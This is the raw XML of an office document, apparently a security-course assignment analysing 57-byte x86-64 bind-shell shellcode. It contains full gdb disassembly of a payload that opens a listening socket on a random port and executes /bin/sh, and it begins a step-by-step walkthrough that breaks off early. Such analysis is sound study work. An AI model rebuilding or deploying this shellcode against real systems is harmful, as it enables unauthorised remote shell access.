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018f" officeooo:paragraph-rsid="0020018f"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0020018f" officeooo:paragraph-rsid="0020018f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="0020018f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004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="0020018f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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="00262efa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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="0029146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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="002e1b5b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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="003001f5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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="00231f8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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00262efa" officeooo:paragraph-rsid="00262efa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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00262efa" officeooo:paragraph-rsid="002763bc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004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="002763bc" officeooo:paragraph-rsid="002763bc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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00291467" officeooo:paragraph-rsid="00291467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004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="002e1b5b" officeooo:paragraph-rsid="002e1b5b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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="002e1b5b" officeooo:paragraph-rsid="003001f5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text-properties fo:color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="003001f5" officeooo:paragraph-rsid="00307ff8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fo:color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="00231f8b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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="0024fea0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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="00291467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fo:color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="003001f5" officeooo:paragraph-rsid="003001f5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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="003001f5" officeooo:paragraph-rsid="00307ff8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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0020018f" officeooo:paragraph-rsid="003001f5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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00307ff8" officeooo:paragraph-rsid="00307ff8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004586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="002e1b5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4586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="003001f5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4586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="003469a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4586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="002e1b5b" officeooo:paragraph-rsid="003001f5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4586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00307ff8" officeooo:paragraph-rsid="00307ff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4586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0032a18f" officeooo:paragraph-rsid="0032a18f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004586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003001f5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4586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0020018f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4586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00307ff8" officeooo:paragraph-rsid="00307ff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4586" fo:font-size="11pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="0020018f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Standard">
      <style:text-properties fo:color="#004586" fo:font-size="11pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="0022649d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text-properties fo:color="#004586" fo:font-size="11pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="00231f8b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text-properties fo:color="#004586" fo:font-size="11pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="00231f8b" style:font-size-asian="11pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-size="11pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="0024fea0" style:font-size-asian="11pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-size="11pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0023caff" officeooo:paragraph-rsid="0023caff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text-properties fo:color="#004586" fo:font-size="11pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0024fea0" officeooo:paragraph-rsid="0024fea0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fo:color="#004586" fo:font-size="11pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="00231f8b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text-properties fo:color="#006600" fo:font-size="9pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="0020018f" style:font-size-asian="9pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="9pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#006600" fo:font-size="9pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="00262efa" style:font-size-asian="9pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="9pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#006600" fo:font-size="9pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="00291467" style:font-size-asian="9pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="9pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#006600" fo:font-size="9pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="003469a3" style:font-size-asian="9pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="9pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0020018f" officeooo:paragraph-rsid="0020018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color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0022649d" officeooo:paragraph-rsid="00231f8b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color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="00231f8b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color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="0024fea0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color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="00231f8b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text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0023caff" officeooo:paragraph-rsid="0023caff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text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="003001f5" officeooo:paragraph-rsid="003001f5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text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002763bc" officeooo:paragraph-rsid="002763bc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fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002763bc" officeooo:paragraph-rsid="00262efa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fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00291467" officeooo:paragraph-rsid="00291467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fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002e1b5b" officeooo:paragraph-rsid="002e1b5b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color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002e1b5b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fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003001f5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color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="00231f8b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000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0023caff" officeooo:paragraph-rsid="0023ca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fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0024fea0" officeooo:paragraph-rsid="0024fea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fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0020018f" officeooo:paragraph-rsid="002e1b5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fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00307ff8" officeooo:paragraph-rsid="003001f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color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00307ff8" officeooo:paragraph-rsid="00307ff8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color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="003001f5" officeooo:paragraph-rsid="003001f5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fo:color="#000000" fo:font-size="11pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0020018f" officeooo:paragraph-rsid="00231f8b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Standard">
      <style:text-properties fo:color="#000000" fo:font-size="11pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="00231f8b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Standard">
      <style:text-properties fo:color="#000000" fo:font-size="11pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0022649d" officeooo:paragraph-rsid="00231f8b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Standard">
      <style:text-properties fo:color="#000000" fo:font-size="11pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0020018f" officeooo:paragraph-rsid="00231f8b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fo:font-size="11pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0023caff" officeooo:paragraph-rsid="0023caff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fo:font-size="9pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0035404f" officeooo:paragraph-rsid="0035404f" style:font-size-asian="9pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="9pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c5000b" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00291467" officeooo:paragraph-rsid="00291467" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c5000b" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00231f8b" officeooo:paragraph-rsid="00291467" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c5000b" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00307ff8" officeooo:paragraph-rsid="00307ff8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fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="0020018f" style:font-weight-asian="bold" style:font-weight-complex="bold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9pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="002b8b24" officeooo:paragraph-rsid="0036ec9b" style:font-size-asian="9pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="9pt" style:font-style-complex="italic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2b8b24" officeooo:paragraph-rsid="0036ec9b" style:font-weight-asian="normal" style:font-weight-complex="normal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36ec9b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51640" officeooo:paragraph-rsid="0036ec9b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color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="003469a3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text-properties fo:color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0035404f" officeooo:paragraph-rsid="0035404f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Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0035404f" officeooo:paragraph-rsid="0035404f" style:font-size-asian="12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text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0020018f" officeooo:paragraph-rsid="003469a3" style:font-size-asian="12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text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0036ec9b" officeooo:paragraph-rsid="0036ec9b" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0035404f" officeooo:paragraph-rsid="0035404f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fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0036ec9b" officeooo:paragraph-rsid="0036ec9b" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P8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3231" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00381b60" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#004586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4586" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0022649d" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0036ec9b" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" officeooo:rsid="0034048a" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" officeooo:rsid="0035404f" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" fo:font-style="normal" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-weight="bold" officeooo:rsid="00381b60" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#004586" officeooo:rsid="00381b60"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#000000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22649d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" officeooo:rsid="003469a3" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T1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24fea0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262efa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style="normal" fo:font-weight="normal" officeooo:rsid="00231f8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fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0022649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0262efa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02763bc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officeooo:rsid="002e1b5b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3001f5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fo:font-weight="normal" officeooo:rsid="0036ec9b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normal" officeooo:rsid="00380a6c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style:font-style-asian="normal" style:font-style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22649d" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="0024fea0" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="00262efa" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="002ac9ff" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="0034048a" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="0014e77d" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="00344f6b" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="0036ec9b" style:font-size-asian="12pt" style:font-size-complex="12pt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2pt" fo:font-style="normal" officeooo:rsid="0022649d" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties officeooo:rsid="00231f8b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3001f5" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T44" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="00307ff8" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T45" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="0036ec9b" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T46" style:family="text">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00307ff8" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T47" style:family="text">
      <style:text-properties officeooo:rsid="002763bc"/>
    </style:style>
    <style:style style:name="T48" style:family="text">
      <style:text-properties officeooo:rsid="002e1b5b"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties officeooo:rsid="003001f5"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties officeooo:rsid="0034048a"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties officeooo:rsid="0035404f"/>
    </style:style>
    <style:style style:name="T52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0066cc" fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T54" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-weight="bold" officeooo:rsid="00381b60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14e77d" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties fo:color="#3333ff" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0011561b" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties officeooo:rsid="0036ec9b"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties officeooo:rsid="00381b60"/>
    </style:style>
    <style:style style:name="gr1" style:family="graphic">
      <style:graphic-properties svg:stroke-width="0.0402in" draw:marker-start-width="0.261in" draw:marker-end-width="0.261in" draw:fill="none" draw:fill-color="#000000" draw:textarea-horizontal-align="center" draw:textarea-vertical-align="middle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5"/><text:span text:style-name="T1">Bind_tcp_random_port <text:s/>shellcode analysis , </text:span><text:span text:style-name="T2">slae64 - 1337</text:span></text:p>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P74">For this analysis I use gdb to disassemble the code </text:p>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P2">gdb output :</text:p>
      <text:p text:style-name="P2"><draw:rect text:anchor-type="paragraph" draw:z-index="0" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.3024in" svg:height="0.2795in" svg:x="-0.078in" svg:y="0.1736in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P3"># gdb shellcode</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:rect text:anchor-type="paragraph" draw:z-index="1" draw:style-name="gr1" draw:text-style-name="P86" svg:width="6.7795in" svg:height="7.5724in" svg:x="-0.078in" svg:y="0.0528in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P41">GNU gdb (GDB) 7.4.1-debian </text:p>
      <text:p text:style-name="P41">Copyright (C) 2012 Free Software Foundation, Inc. </text:p>
      <text:p text:style-name="P41">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt; </text:p>
      <text:p text:style-name="P41">This is free software: you are free to change and redistribute it. </text:p>
      <text:p text:style-name="P41">There is NO WARRANTY, to the extent permitted by law. <text:s/>Type "show copying" </text:p>
      <text:p text:style-name="P41">and "show warranty" for details. </text:p>
      <text:p text:style-name="P41">This GDB was configured as "x86_64-linux-gnu". </text:p>
      <text:p text:style-name="P41">For bug reporting instructions, please see: </text:p>
      <text:p text:style-name="P41">&lt;http://www.gnu.org/software/gdb/bugs/&gt;... </text:p>
      <text:p text:style-name="P41">Reading symbols from /root/Desktop/Exam/Assignment5/Untitled Folder/shellcode...(no debugging symbols found)...done. </text:p>
      <text:p text:style-name="P41">(gdb) b *&amp;code </text:p>
      <text:p text:style-name="P41">Breakpoint 1 at 0x600980 </text:p>
      <text:p text:style-name="P41">(gdb) r </text:p>
      <text:p text:style-name="P41">Starting program: /root/Desktop/Exam/Assignment5/Untitled Folder/shellcode </text:p>
      <text:p text:style-name="P41">Shellcode Length: <text:s/>57 </text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41">Breakpoint 1, 0x0000000000600980 in code () </text:p>
      <text:p text:style-name="P41">(gdb) disassemble </text:p>
      <text:p text:style-name="P41"><text:s/>0x0000000000600980 &lt;+0&gt;:<text:tab/>xor <text:s text:c="3"/>rsi,rsi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x0000000000600983 &lt;+3&gt;:<text:tab/>mul <text:s text:c="3"/>rsi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x0000000000600986 &lt;+6&gt;:<text:tab/>inc <text:s text:c="3"/>esi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x0000000000600988 &lt;+8&gt;:<text:tab/>push <text:s text:c="2"/>0x2 </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x000000000060098a &lt;+10&gt;:<text:tab/>pop <text:s text:c="3"/>rdi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x000000000060098b &lt;+11&gt;:<text:tab/>mov <text:s text:c="3"/>al,0x29 </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x000000000060098d &lt;+13&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x000000000060098f &lt;+15&gt;:<text:tab/>push <text:s text:c="2"/>rdx </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x0000000000600990 &lt;+16&gt;:<text:tab/>pop <text:s text:c="3"/>rsi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x0000000000600991 &lt;+17&gt;:<text:tab/>push <text:s text:c="2"/>rax </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x0000000000600992 &lt;+18&gt;:<text:tab/>pop <text:s text:c="3"/>rdi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x0000000000600993 &lt;+19&gt;:<text:tab/>mov <text:s text:c="3"/>al,0x32 </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x0000000000600995 &lt;+21&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x0000000000600997 &lt;+23&gt;:<text:tab/>mov <text:s text:c="3"/>al,0x2b </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x0000000000600999 &lt;+25&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x000000000060099b &lt;+27&gt;:<text:tab/>push <text:s text:c="2"/>rdi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x000000000060099c &lt;+28&gt;:<text:tab/>pop <text:s text:c="3"/>rsi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x000000000060099d &lt;+29&gt;:<text:tab/>xchg <text:s text:c="2"/>rdi,rax </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x000000000060099f &lt;+31&gt;:<text:tab/>dec <text:s text:c="3"/>esi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009a1 &lt;+33&gt;:<text:tab/>mov <text:s text:c="3"/>al,0x21 </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009a3 &lt;+35&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009a5 &lt;+37&gt;:<text:tab/>jne <text:s text:c="3"/>0x60099f &lt;code+31&gt; </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009a7 &lt;+39&gt;:<text:tab/>push <text:s text:c="2"/>rdx </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009a8 &lt;+40&gt;:<text:tab/>movabs rdi,0x68732f6e69622f2f </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009b2 &lt;+50&gt;:<text:tab/>push <text:s text:c="2"/>rdi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009b3 &lt;+51&gt;:<text:tab/>push <text:s text:c="2"/>rsp </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009b4 &lt;+52&gt;:<text:tab/>pop <text:s text:c="3"/>rdi </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009b5 &lt;+53&gt;:<text:tab/>mov <text:s text:c="3"/>al,0x3b </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009b7 &lt;+55&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P41"><text:s text:c="3"/>0x00000000006009b9 &lt;+57&gt;:<text:tab/>add <text:s text:c="3"/>BYTE PTR [rax],al </text:p>
      <text:p text:style-name="P41">End of assembler dump. </text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P4"><text:span text:style-name="T13">Analysis step by step</text:span> :</text:p>
      <text:p text:style-name="P4"><text:soft-page-break/></text:p>
      <text:p text:style-name="P45">First couple of instructions:</text:p>
      <text:p text:style-name="P45"/>
      <text:p text:style-name="P45"/>
      <text:p text:style-name="P45"><draw:rect text:anchor-type="paragraph" draw:z-index="3" draw:style-name="gr1" draw:text-style-name="P86" svg:width="1.9421in" svg:height="1.5961in" svg:x="-0.1126in" svg:y="0.0661in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P4"><text:s/><text:span text:style-name="T50">&lt;+0&gt;</text:span>xor <text:s text:c="3"/>rsi,rsi </text:p>
      <text:p text:style-name="P4"><text:s/><text:span text:style-name="T50">&lt;+3&gt;</text:span>mul <text:s text:c="3"/>rsi </text:p>
      <text:p text:style-name="P4"><text:s/><text:span text:style-name="T50">&lt;+6&gt;i</text:span>nc <text:s text:c="3"/>esi </text:p>
      <text:p text:style-name="P4"><text:s/><text:span text:style-name="T50">&lt;+8&gt;</text:span>push <text:s text:c="2"/>0x2 </text:p>
      <text:p text:style-name="P4"><text:s/><text:span text:style-name="T50">&lt;+10&gt;</text:span> pop <text:s text:c="3"/>rdi </text:p>
